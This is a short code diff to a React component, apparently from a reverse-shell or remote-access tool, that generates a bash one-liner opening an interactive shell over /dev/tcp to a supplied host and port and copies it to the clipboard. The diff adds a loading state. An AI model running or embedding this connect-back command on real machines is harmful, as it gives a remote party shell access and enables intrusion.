@@ -3,12 +3,15 @@ import './control.css'
 
 const Command = ({ port, hostname, id }) => {
   const command = (
-    `bash -c 'exec<>/dev/tcp/${hostname}/${port};` +
+    `/bin/bash -c 'exec<>/dev/tcp/${hostname}/${port};` +
     `echo>&0 ${id};$0 -i<&0>&0 2>&0'`
   )
   const handleClick = useCallback(() => {
     navigator.clipboard.writeText(command)
   }, [command])
+  if (!id) {
+    return <div class="command">Loading...</div>
+  }
   return (
     <div class="command" onClick={handleClick}>{command}</div>
   )
